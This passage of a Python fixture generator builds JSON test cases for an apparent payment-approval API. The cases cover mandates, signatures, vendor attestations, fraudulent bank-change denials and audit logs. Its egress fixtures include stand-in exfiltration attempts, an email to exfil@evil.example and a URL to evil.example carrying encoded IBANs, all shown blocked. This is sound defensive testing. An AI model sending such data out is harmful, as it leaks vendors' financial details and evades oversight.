                       callback={"status": "confirmed", "code_exp": "2026-10-19T12:10:00Z"}),
                vendor_id="ven_87654321", vendor_ico="87654321", vendor_name="Beta Servis a.s.",
                old_iban=BETA_IBAN, in_network=False)


def err(code, msg, **details):
    e = {"error": code, "message": msg}
    if details:
        e["details"] = details
    return e


def ev(seq: int, type_: str, subject_id: str | None, data: dict, actor: str = "executor", log_id: str = "audit", ts: str = "2026-10-19T12:02:03.120Z") -> dict:
    return {"v": 1, "log_id": log_id, "seq": seq, "ts": ts, "type": type_, "actor": actor,
            "subject_id": subject_id, "data": data}


AUDIT_EVENTS = {
    "proposal": ev(34, "proposal", "prp_38", {"proposal_id": "prp_38", "invoice": INVOICE_OK, "hints": []},
                   actor="agent"),
    "facts": ev(35, "facts", "prp_38", {"subject_id": "prp_38", "facts": F_ACME_OK}),
    "decision": ev(36, "decision", "prp_38", {"subject_id": "prp_38", "decision": "allow", "rule_ids": [],
                                              "mandate_id": "mnd_3", "policy_hash": POLICY_HASH}),
    "execution": ev(37, "execution", "tx_38", {k: TX[k] for k in ("tx_id", "proposal_id", "vendor_id", "iban",
                                                                   "amount_minor", "currency", "authorization")}),
    "signature_rejected": ev(52, "signature", "chg_7", {
        "nonce": "4F2A9C", "purpose": "CHG", "role": "clerk", "signer_address": CLERK,
        "text_sha256": CHG_CH["text_sha256"], "sig": _sig("chg7"), "accepted": False,
        "error": "vendor_attestation_missing"}, actor="host"),
    "state_transition": ev(60, "state_transition", "chg_8", {"change_id": "chg_8", "from": "COOLING",
                                                             "to": "SIG_CLERK", "reason": "cooling elapsed"}),
    "egress_block": ev(71, "egress_block", None, {
        "tool": "send_email", "target": "exfil@evil.example", "rule_ids": ["E-ALLOWLIST", "E-DLP-IBAN"],
        "findings": [{"rule_id": "E-DLP-IBAN", "detail": "IBANs from vendor registry", "count": 12}],
        "content_sha256": _h("exfil")}, actor="agent"),
    "attestation": ev(5, "attestation", "12345678#5", {"ico": "12345678", "v": 5, "action": "propose",
                                                       "status": "PUBLISHED", "commitment": _h("commit5"),
                                                       "attest_leaf_index": 5}, log_id="attest",
                      actor="vendor_portal"),
}

FIXTURES_SPEC = {
    "mandates_create": [
        ("ok", "POST /mandates", 201,
         {"max_per_payment_minor": 8000000, "max_total_minor": 25000000, "max_count": 20,
          "payee_scope": "existing_only", "valid_until": "2026-10-20T16:00:00Z", "currency": "CZK"},
         {"mandate": mandate(), "challenge": MANDATE_CH}),
        ("invalid", "POST /mandates", 400,
         {"max_per_payment_minor": 8000000, "max_total_minor": 25000000, "max_count": 20,
          "payee_scope": "existing_only", "valid_until": "2026-10-20T16:00:00Z", "currency": "CZK"},
         err("invalid_request", "max_total_minor must be >= max_per_payment_minor")),
    ],
    "mandates_active": [
        ("ok", "GET /mandates/active", 200, None, ACTIVE_MANDATE),
        ("none", "GET /mandates/active", 404, None, err("no_mandate", "no ACTIVE mandate")),
    ],
    "proposals_create": [
        ("allow", "POST /proposals", 201, {"invoice": INVOICE_OK, "hints": []},
         {"proposal": proposal(38, "EXECUTED", INVOICE_OK, F_ACME_OK, DEC_ALLOW, tx_id="tx_38"),
          "decision": DEC_ALLOW, "tx": TX}),
        ("challenge", "POST /proposals", 201,
         {"invoice": INVOICE_BIG, "hints": [{"source": "agent", "text": "service contract Q4"}]},
         {"proposal": proposal(41, "PENDING_SIG", INVOICE_BIG, [F_OVER, F_VAT_OK], DEC_CH, challenge_nonce="0C55A1",
                               hints=[{"source": "agent", "text": "service contract Q4"}]),
          "decision": DEC_CH, "tx": None}),
        ("deny_dup", "POST /proposals", 201, {"invoice": INVOICE_DUP},
         {"proposal": proposal(42, "DENIED", INVOICE_DUP, F_ACME_OK + [F_DUP], DEC_DENY),
          "decision": DEC_DENY, "tx": None}),
    ],
    "changes_create": [
        ("bec_lookalike_deny", "POST /changes", 201,
         {"vendor_ico": "12345678", "new_iban": FRAUD_IBAN, "email_id": "eml_9a8b7c6d5e4f3021",
          "hints": [{"source": "agent", "text": "bank change, urgent"}]},
         {"change": CHG7, "decision": decision("deny", ["F-ATTEST", "F-BANK", "F-DOMAIN", "F-VAT", "F-FIRSTSEEN"],
                                               BEC_FACTS, CHG_CH, mandate_id=None)}),
        ("legit_challenge", "POST /changes", 201,
         {"vendor_ico": "12345678", "new_iban": NEW_LEGIT_IBAN, "email_id": "eml_1122334455667788"},
         {"change": change(8, "COOLING", NEW_LEGIT_IBAN, LEGIT_FACTS, CHG8_CH, not_before="2026-10-19T12:01:30Z"),
          "decision": decision("challenge", ["F-VAT"], LEGIT_FACTS, CHG8_CH, mandate_id=None)}),
    ],
    "changes_get": [
        ("sig_clerk", "GET /changes/{change_id}", 200, None, CHG8_SIG_CLERK),
        ("off_network_callback_confirmed", "GET /changes/{change_id}", 200, None, CHG9_OFF),
        ("missing", "GET /changes/{change_id}", 404, None, err("not_found", "change chg_99 not found")),
    ],
    "changes_reject": [
        ("ok", "POST /changes/{change_id}/reject", 200, {"reason": "clerk: fraud"},
         dict(CHG7, state="REJECTED", pending_challenge=None)),
        ("terminal", "POST /changes/{change_id}/reject", 409, {"reason": "x"},
         err("state_conflict", "change chg_8 is ACTIVE", state="ACTIVE")),
    ],
    "challenges_get": [
        ("mandate", "GET /challenges/{nonce}", 200, None, dict(MANDATE_CH, used=False, created_at=NOW)),
        ("chg", "GET /challenges/{nonce}", 200, None, dict(CHG_CH, used=False, created_at=NOW)),
        ("pay", "GET /challenges/{nonce}", 200, None, dict(PAY_CH, used=True, created_at=NOW)),
    ],
    "signatures_submit": [
        ("mandate_activated", "POST /signatures", 200,
         {"nonce": "91BC02", "role": "clerk", "sig": _sig("m3"), "displayed_text": MANDATE_CH["text"]},
         {"nonce": "91BC02", "purpose": "MANDATE", "subject_id": "mnd_3", "signer_address": CLERK,
          "effect": {"type": "mandate_activated"},
          "mandate": mandate("ACTIVE", signer_address=CLERK, activated_at="2026-10-19T12:01:10Z")}),
        ("payment_executed", "POST /signatures", 200, {"nonce": "0C55A1", "role": "clerk", "sig": _sig("p41")},
         {"nonce": "0C55A1", "purpose": "PAY", "subject_id": "prp_41", "signer_address": CLERK,
          "effect": {"type": "payment_executed", "tx_id": "tx_41"},
          "tx": dict(TX, tx_id="tx_41", proposal_id="prp_41", vendor_id="ven_87654321", iban=BETA_IBAN,
                     amount_minor=12500000, vs="2026104", leaf_index=48,
                     authorization={"kind": "stepup", "nonce": "0C55A1", "signer_address": CLERK})}),
        ("render_mismatch", "POST /signatures", 403,
         {"nonce": "4F2A9C", "role": "clerk", "sig": _sig("chg7"),
          "displayed_text": "AIRGAP CHG #7 n:4F2A9C exp:14:05\nACME s.r.o. OK\nVoP OK"},
         err("render_mismatch", "displayed text differs from executor render",
             expected_sha256=CHG_CH["text_sha256"])),
        ("vendor_attestation_missing", "POST /signatures", 403,
         {"nonce": "4F2A9C", "role": "clerk", "sig": _sig("chg7")},
         err("vendor_attestation_missing", "ACME s.r.o. 0/3 signatures for new IBAN", state="ATTESTATION_CHECK")),
        ("replay", "POST /signatures", 403, {"nonce": "91BC02", "role": "clerk", "sig": _sig("m3")},
         err("nonce_reused", "challenge 91BC02 already used")),
    ],
    "callbacks_submit": [
        ("confirm", "POST /callbacks/{change_id}", 200, {"code": "482913", "outcome": "confirm"}, CHG9_OFF),
        ("bad_code", "POST /callbacks/{change_id}", 403, {"code": "000000", "outcome": "confirm"},
         err("callback_code_invalid", "wrong or expired callback code")),
    ],
    "portal_notifications": [
        ("ok", "GET /portal/notifications", 200, None, {"notifications": [
            {"notif_id": "2026-10-19T12:00:01Z#3C9F01", "ico": "87654321", "kind": "tripwire",
             "change_id": "chg_9", "created_at": "2026-10-19T12:00:01Z"},
            {"notif_id": "2026-10-19T12:00:02Z#77AB10", "ico": "87654321", "kind": "callback",
             "change_id": "chg_9", "code": "482913", "created_at": "2026-10-19T12:00:02Z"}]}),
    ],
    "attestations_create": [
        ("propose", "POST /attestations", 201,
         {"action": "propose", "ico": "12345678", "iban": NEW_LEGIT_IBAN, "valid_from": "2026-10-20",
          "supersedes": 4, "penny_nonce": "PX-91-4421"},
         {"attestation": attestation("PENDING_SIGS", []),
          "challenges": [att_challenge("director", "OR", "7D11E0"), att_challenge("accountant", "POA", "7D11E1"),
                         att_challenge("finance", "POA", "7D11E2")]}),
        ("revoke_unknown", "POST /attestations", 404, {"action": "revoke", "ico": "12345678", "revokes_v": 9},
         err("not_found", "attestation 12345678#9 not found")),
    ],
    "attestations_get": [
        ("published", "GET /attestations/{ico}", 200, None, {
            "attestation": attestation("PUBLISHED", [
                {"role": "director", "address": JED, "sig": _sig("jed"), "nonce": "7D11E0"},
                {"role": "accountant", "address": UCT, "sig": _sig("uct"), "nonce": "7D11E1"}],
                leaf_index=5, commitment=_h("commit5")),
            "policy": {"ico": "12345678", "policy_v": 1, "signers": ATT_POLICY["signers"], "threshold": 2,
                       "status": "ACTIVE", "or_extract_sha256": _h("or-acme"), "created_at": "2026-10-19T11:00:00Z"},
            "inclusion_proof": {"log_id": "attest", "leaf_index": 5, "tree_size": 6, "leaf_hash": _h("leaf5"),
                                "audit_path": [_h("p0"), _h("p1")], "sth": ATT_STH}}),
    ],
    "egress": [
        ("allow_vendor_reply", "POST /egress", 200,
         {"tool": "send_email", "target": "fakturace@acme.cz",
          "content": "Hello, we received invoice FV-2026-0412. Thank you."},
         {"decision": "allow", "rule_ids": [], "findings": []}),
        ("block_exfil", "POST /egress", 403,
         {"tool": "send_email", "target": "exfil@evil.example",
          "content": "ACME s.r.o. 12345678 CZ6508000000192000145399; Beta Servis a.s. 87654321 ..."},
         err("egress_blocked", "target not on allowlist; registry identifiers in content", decision={
             "decision": "block", "rule_ids": ["E-ALLOWLIST", "E-DLP-IBAN", "E-DLP-ICO"],
             "findings": [{"rule_id": "E-ALLOWLIST", "detail": "evil.example not allowlisted", "count": 1},
                          {"rule_id": "E-DLP-IBAN", "detail": "IBANs from vendor registry", "count": 2},
                          {"rule_id": "E-DLP-ICO", "detail": "ICO from vendor registry", "count": 2}]})),
        ("block_url_data", "POST /egress", 403,
         {"tool": "http_get", "target": "https://evil.example/p.png?d=Q1o2NTA4MDAwMDAwMTkyMDAwMTQ1Mzk5", "content": ""},
         err("egress_blocked", "data in URL", decision={
             "decision": "block", "rule_ids": ["E-ALLOWLIST", "E-ENCODED", "E-URLDATA"],
             "findings": [{"rule_id": "E-URLDATA", "detail": "query parameter d", "count": 1}]})),
    ],
    "audit_export": [
        ("ok", "GET /audit/export", 200, None, {
            "log_id": "audit",
            "leaves": [{"seq": e["seq"], "event": e, "leaf_hash": _h(f"leaf{e['seq']}")}
                       for k, e in AUDIT_EVENTS.items() if e["log_id"] == "audit"][:4],
            "sths": [STH],
            "anchors": [{"s3_key": "audit-anchor/audit/000000000040.json", "sth": STH, "tsa_token_b64": "MIIC"}],
            "public_keys": {"executor": "-----BEGIN PUBLIC KEY-----\\n...", "witness": "-----BEGIN PUBLIC KEY-----\\n..."},
            "policy": {"policy_v": 1, "rules": []}}),
    ],
    "receipts_get": [
        ("ok", "GET /receipts/{tx_id}", 200, None, {
            "tx": TX, "inclusion_proof": {"log_id": "audit", "leaf_index": 37, "tree_size": 40,
                                          "leaf_hash": _h("leaf37"), "audit_path": [_h("a"), _h("b"), _h("c")],
                                          "sth": STH},
            "receipt_sig": "MEQCIexample==", "key_id": "alias/airgap-executor"}),
        ("missing", "GET /receipts/{tx_id}", 404, None, err("not_found", "tx_999 not found")),
    ],
    "vendors_list": [("ok", "GET /vendors", 200, None, {"vendors": [VENDOR_ACME, VENDOR_BETA]})],
    "ledger_list": [("ok", "GET /ledger", 200, None, {"txs": [TX]})],
    "ingest": [
        ("ok", "POST /ingest", 201, {"raw_b64": "RnJvbTogdWNldG5pQGFjbWUtY3ouY29tDQo=", "received_at": NOW},
         {"email_id": "eml_9a8b7c6d5e4f3021", "from_domain": "acme-cz.com", "received_at": NOW}),
        ("bad", "POST /ingest", 400, {"raw_b64": "@@@"}, err("invalid_request", "raw_b64 is not base64")),
    ],
    "health": [("ok", "GET /health", 200, None, {"status": "ok", "backend": "memory", "policy_hash": POLICY_HASH,
                                                "render_width": 32})],
}


def write_fixtures():
    for group, cases in FIXTURES_SPEC.items():
        d = FIXTURES / group
        d.mkdir(parents=True, exist_ok=True)
        for case, endpoint, status, req, resp in cases:
            doc = {"endpoint": endpoint, "status": status, "request": req, "response": resp}
            (d / f"{case}.json").write_text(json.dumps(doc, indent=2, ensure_ascii=False) + "\n")
    d = FIXTURES / "audit_events"
    d.mkdir(parents=True, exist_ok=True)
    for name, e in AUDIT_EVENTS.items():
        (d / f"{name}.json").write_text(json.dumps(e, indent=2, ensure_ascii=False) + "\n")


if __name__ == "__main__":
    write_schemas()
    write_fixtures()
    print(f"schemas: {len(SCHEMA_FILES) + 1}, fixture groups: {len(FIXTURES_SPEC) + 1}")
